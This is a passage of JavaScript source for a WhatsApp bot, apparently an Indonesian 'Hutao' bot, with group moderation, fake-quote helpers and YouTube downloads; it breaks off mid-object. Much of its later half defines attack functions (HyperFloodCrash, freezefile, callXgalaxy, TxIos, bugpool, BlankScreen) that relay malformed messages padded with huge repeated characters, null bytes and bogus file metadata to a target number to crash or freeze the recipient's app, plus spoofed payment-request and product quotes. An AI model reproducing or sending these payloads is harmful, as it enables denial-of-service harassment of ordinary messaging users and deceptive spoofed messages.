var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await cay.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await cay.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}
    //ANTI STIKER
    if (antistiker.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
    if(isSticker === "stickerMessage"){
        } else {
         // m.reply(`\`\`\`「 Sticker Detected 」\`\`\`\n\n> _∅  admin melarang adanya *sticker* di grup ini_`)
    return cay.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }}
  
  //mute 
if (m.isGroup && isMute) {
if (!isAdmin && !isOwner) return
}

// FUNCTION ONLY PRIVATE CHAT
        if (global.onlypc) {
        	if (command&&isGroup){
	         return m.reply(`Hutao dalam mode private, gunakan di private chat!`)
	     }
	}
// FUNCTION ONLY PRIVATE CHAT
        if (global.onlygc) {
        	if (command&&!isGroup){
	         return !0;
	     }
	}
/*
      if (global.antisticker && isStickerr && !isCreator && !isAdmin && isBotAdmin) {
    if(isImagee === "imageMessage"){
        } else {
          m.reply(`\`\`\`「 Sticker Detected 」\`\`\`\n\n> _∅  Admin melarang adanya *sticker* di grup ini_`)
    return cay.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }*/
//========= FAKE QUOTED =========//





const fkontak = { key: {fromMe: false,participant: `6287875411618@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: ppuser }}}}
//pler
const reply = (teks) => {
cay.sendMessage(from, { text: teks, contextInfo: {
            mentionedJid: [],
            groupMentions: [],
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363357312070270@newsletter',
               newsletterName: `${global.namaowner}`,
                serverMessageId: -1
            },
            forwardingScore: 256,
externalAdReply: {
        showAdAttribution: true,
        title: `powered by caywzz`,
        body: `buy/sewa?`,
        thumbnailUrl: `https://files.catbox.moe/kxesg4.jpg`,
        sourceUrl: "https://wa.me/6287875411618",
        mediaType: 1,
        renderLargerThumbnail: false
          }
        }}, { quoted: fkontak })}
// FUNCTION 
function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}
 // REPLY API
const fcall = { key: {fromMe: false, participant: `6287875411618@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}
// REPLY CUSTOM TEXT
/*const menfes ={key: {fromMe: false, participant: `6287875411618@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast"} : {})}, message: {extendedTextMessage: {text: `${resis.quotes}`}}}*/
const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '6287875411618@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `Powered By ${namaowner}`,
inviteExpiration: Date.now() + 1814400000
}
}}

const qtoko = {
key: {
fromMe: false,
participant: `6287875411618@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
}, message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": "",
},
"title": `Pterodactyl Server By ${namastore}`,
"description": null,
"currencyCode": "IDR",
"priceAmount1000": "9999999999",
"retailerId": `Powered By ${namastore}`,
"productImageCount": 1
},
"businessOwnerJid": `6287875411618@s.whatsapp.net`
}}
}
// REPLY WITH TROLI
const ftroli ={key: {fromMe: false,"participant":"6287875411618@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2024,status: 200, thumbnail: ppuser, surface: 200, message: `${global.namabot}`, orderTitle: 'By Hutao', sellerJid: '6287875411618@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
// REPLY WITH DOCUMENT
const fdoc = {key : {participant : '6287875411618@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `halo ${pushname}`,jpegThumbnail: ppuser}}}
//REPLY WITH VN
const fvn = {key: {participant: `6287875411618@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
// REPLY WITH GIFT
const fgif = {key: {participant: `6287875411618@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title": 'Hutao', "h": 'Hutao','seconds': '359996400', 'gifPlayback': 'true', 'caption': 'Hutao', 'jpegThumbnail': ppuser}}}
// REPLY WITH GROUP LINK
const fgclink = {key: {participant: "6287875411618@s.whatsapp.net","remoteJid": "6287875411618@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6287875411618-1616169743@g.us","inviteCode": "m","groupName": "Hutao", "caption": `${pushname}`, 'jpegThumbnail': ppuser}}}
const qtext2 = { key: {fromMe: false, participant: `6287875411618@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: `${global.namaowner}` }}}

const qtext = { key: {fromMe: false, participant: `6287875411618@s.whatsapp.net`, ...(m.chat ? { remoteJid: "6287875411618@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "Terimakasih telah order"}}}

const qlive = {key: {participant: '6287875411618@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `cay`,jpegThumbnail: ""}}}

const qaudio = {key: {participant: '6287875411618@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {audioMessage: {seconds: 900030, ptt: true }}}

const qkontak = {
key: {
participant: `6287875411618@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `CAYWZZ🌸`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6289508082845:+62 895-0808-2845\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}
const fpayment2 = {key: { remoteJid: '6287875411618@s.whatsapp.net', fromMe: false, id: `caywzz`, participant: '6287875411618@s.whatsapp.net' }, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 1, requestFrom: '6287875411618@s.whatsapp.net', noteMessage: {extendedTextMessage: {text: `sʇᴉp`}}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
const qpayment = {
key: {remoteJid: '6287875411618@s.whatsapp.net', fromMe: false, id: `namaowner`, participant: '6287875411618@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "IDR", amount1000: 999999999, requestFrom: '6287875411618@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "cay"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "INR"}}}}

//send message kontak pp user

/*function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}*/

// SEND MESSAGE DOCUMENT
const sendres = (huhu, teks) => {
cay.sendMessage(huhu, {
document: fs.readFileSync('./assets/sticker/kym.png'),
fileName: `${salam}`,
mimetype: "image/png",
fileLength: 99999999999,
jpegThumbnail: fs.readFileSync('./assets/sticker/kym.png'),
description: 'hello',
caption: teks,
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender],
businessMessageForwardInfo: {  
businessOwnerJid: global.owner 
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Hutao Only`,
newsletterJid: global.idsal},
externalAdReply: { 
title: `Hutao`, 
body: `Online On ${runtime(process.uptime())}`,
thumbnailUrl: `https://files.catbox.moe/ueipwo.jpg`,
sourceUrl: `${global.saluran}`,
mediaType: 1,
renderLargerThumbnail: true }}},
{quoted:fpayment2})}
//reply giff
const reply99 = async(teks) => {
        cay.sendMessage(from, {
        video: {url: "https://telegra.ph/file/2ad8ae300928a913af81c.mp4"},
        mimetype: 'video/mp4',
        fileLength: 10000000000,
        caption: text,
        gifPlayback: true,
        gifAttribution: 5,
        contextInfo: {
        externalAdReply: {
        title: global.namabot, 
        body: '© powered by caywzz',
        thumbnail: global.imgreply, 
        sourceUrl: global.saluran,
        mediaType: 1,
        renderLargerThumbnail: false,
        }}
          }, {
            quoted: m
          })  
}


/*const onlyGroup = async() => {
let joinbang = `hallo ${tag}, untuk menggunakan semua fitur *bot Hutao*, harap masukan bot ke group anda terlebih dahulu agar anda dapat akses lebih di dalam group gratis tanpa prabayar\n\nAtau anda bisa membeli akses sewa & premium dari owner\n\natau masuk grup kami kak${global.group}`
m.reply(joinbang)}*/

/*const onlyGc = async() => {reply(global.msg.group)};
//reply game*/

const reply795 = async(teks) => {

cay.sendMessage(from, {text: teks, contextInfo:{

mentionedJid: m.ments(`${teks}`),

forwardingScore: 0,  

isForwarded: true,  

businessMessageForwardInfo: {

bussinessName: 'memek',

businessOwnerJid: global.owner

},

externalAdReply : {

title: `Hallo ${pushname}`, 

body: `selamat ${ucapan}()`,

mediaType: 1,

previewType: "PHOTO",

thumbnailUrl: global.imgreply,

renderLargerThumbnail: true,

sourceUrl: `${global.saluran}`}}})

}
//========== FUNCTION ===========//
var ppuser
try {
ppuser = await cay.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}


let example = (teks) => {
return `*Contoh Cara Command :*\nketik *${cmd}* ${teks}`
}


function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
function monospace(string) {
return '```' + string + '```'
}
function monospa(string) {
return '`' + string + '`'
}
const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
/*for (let ruztanX of imagenya){
if (budy === ruztanX) {
let imagebuffy = fs.readFileSync(`./testi/${ruztanX}.jpg`)
cay.sendImage(m.chat, result, '', m)
cay.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}*/

function pickRandom(list) {
return list[Math.floor(list.length * Math.random())]
}

    async function uploadUguu(path) {
  try {
    const form = new FormData()
    form.append("files[]", fs.createReadStream(path))   
    const res = await fetch("https://uguu.se/upload.php", {
      method: "POST",
      headers: form.getHeaders(),
      body: form
    })    
    const json = await res.json()
    await fs.promises.unlink(path)   
    return json
  } catch (e) {
    await fs.promises.unlink(path)
    throw "Upload failed"
  }
    }

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}
			const YouTubeMp3 = async (Link, Quality = 128) => {
			try {
				if (!isUrl(Link)) return reply("Cekk tulisan kamu, itu salah!")
				let data = await ytdl.ytmp3(Link, Quality);
				await cay.sendMessage(m.chat, {
					audio: {
						url: data.download.url
					},
					mimetype: 'audio/mpeg',
					contextInfo: {
						forwardingScore: 9999999,
						isForwarded: true,
						externalAdReply: {
							title: `乂 YTMP3 - ${data.download.quality}`,
							body: data.metadata.title,
							mediaType: 1,
							previewType: 0,
							renderLargerThumbnail: true,
							thumbnailUrl: data.metadata.thumbnail,
							sourceUrl: Link
						}
					}
				}, {
					quoted: m
				});
			} catch (error) {
				await m.errorReport(util.format(error), command);
			}
		};

	
		// dll //
				const YouTubeMp4 = async (Link, Quality = 360) => {
			try {
				if (!isUrl(Link)) return reply("Mana link nya?")
				let data = await ytdl.ytmp4(Link, Quality);
				const caption = `*${data.metadata.title}*

*⌬ Ext* : Download
*⌬ ID* : ${data.metadata.videoId}
*⌬ Durasi* : ${data.metadata.timestamp}
*⌬ Upload* : ${data.metadata.ago}
*⌬ Views* : ${data.metadata.views}
*⌬ Quality* : ${data.download.quality}
*⌬ Channel* : ${data.metadata.author.name}

© Hutaobot `;

				await cay.sendMessage(m.chat, {
					video: {
						url: data.download.url
					},
					caption: caption,
					gifPlayback: false
				}, {
					quoted: m
				});
			} catch (error) {
				await m.errorReport(util.format(error), command);
			}
		};
async function HyperFloodCrash(nomor, ptcp = false) {
    const hyperFloodMessage = {
        templateMessage: {
            hydratedTemplate: {
                hydratedHeaderText: "🚨 ALERT: SYSTEM FAILURE 🚨",
                hydratedFooterText: "⚠️ CRASH IMMINENT ⚠️",
                hydratedContentText: "💣".repeat(20000) + "💥".repeat(15000),
                hydratedButtons: Array.from({ length: 5 }, (_, i) => ({
                    quickReplyButton: {
                        displayText: `Button ${i + 1}`,
                        id: `button-${i + 1}`,
                    },
                })),
            },
        },
    };
    // floodnya, bisa atur sesuai mau mu, ubah aja 100 jadi misal 
    // 20/10
    for (let i = 0; i < 15; i++) {
        try {
            await cay.relayMessage(
                nomor,
                hyperFloodMessage,
                {
                    participant: { jid: nomor },
                    messageId: null,
                }
            );
            console.log(`Sending Hydrated By Anggazyy Developer`);
        } catch (error) {
            console.error(`Error Bang : ${i + 1}: ${error.message}`);
        }

       
        await new Promise(resolve => setTimeout(resolve, 2000));
    }

    console.log("Attacking HyperFlood selesai");
}
async function freezefile(nomor, ptcp = false) {
    let virtex = "🌸͜͞𐊢ăŶ͜͝ɯʐʐ🌿" + "@0".repeat(250000);
    await cay.relayMessage(nomor, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: nomor } }, { messageId: null });
}
async function callXgalaxy(nomor, ptcp = false ) {
  cay.relayMessage(nomor, {
    viewOnceMessage: {
        message: {
            interactiveMessage: {
                header: {
                    documentMessage: {
                        url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                        mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                        fileLength: "999999999",
                        pageCount: 0x9184e729fff,
                        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                        fileName: "Cyawzz!",
                        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                        directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                        mediaKeyTimestamp: "1715880173",
                        contactVcard: true
                    },
                    title: "",
                    hasMediaAttachment: true
                },
                body: {
                    text: ""
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'call_permission_request',
                            buttonParamsJson: '{}'
                        }
                    ]
                },
                contextInfo: {
                    quotedMessage: {
                        interactiveResponseMessage: {
                            body: { 
                                text: "Sent", 
                                format: "DEFAULT" 
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: `{
                                    "screen_2_OptIn_0": true,
                                    "screen_2_OptIn_1": true,
                                    "screen_1_Dropdown_0": "DeAD CoDe",
                                    "screen_1_DatePicker_1": "1028995200000",
                                    "screen_1_TextInput_2": "mark@startech.id",
                                    "screen_1_TextInput_3": "94643116",
                                    "screen_0_TextInput_0": "radio - buttons${"\u0003".repeat(1020000)}",
                                    "screen_0_TextInput_1": "Why?",
                                    "screen_0_Dropdown_2": "001-Grimgar",
                                    "screen_0_RadioButtonsGroup_3": "0_true",
                                    "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    }
}, { participant: { jid: nomor } }, { messageId: null });
}
		async function TxIos(nomor, Ptcp = false) {
			await cay.relayMessage(nomor, {
					"extendedTextMessage": {
						"text": "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "0@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "0@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": nomor,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "0@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸",
								"body": "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://t.me/caywzzneh",
								"mediaUrl": "https://t.me/caywzzneh",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://t.me/caywzzneh"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "0@s.whatsapp.net",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "0@s.whatsapp.net",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: nomor
					}
				} : {}
			);
			console.log(chalk.red("🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸"));
		};
		async function bugpool(nomor, ptcp = false) {
    let mark = '0@s.whatsapp.net';
    await cay.relayMessage(nomor, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        name: "ꦾ".repeat(77777),
                        options: [
                            { optionName: "ꦾ".repeat(77777) },
                            { optionName: "ꦾ".repeat(77777) }
                        ],
                        selectableOptionsCount: 0
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: nomor } }, { messageId: null });
}
		async function BlankScreen(nomor, Ptcp = false) {
let virtex = "🌸͜͞𐊢ăŶ͜͝ɯʐʐ🌿" + "ꦾ".repeat(77777) + "@0".repeat(50000);
			await cay.relayMessage(nomor, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "🌸͜͞𐊢ăŶ͜͝ɯʐʐ🌿",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000".repeat(5000),
								},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
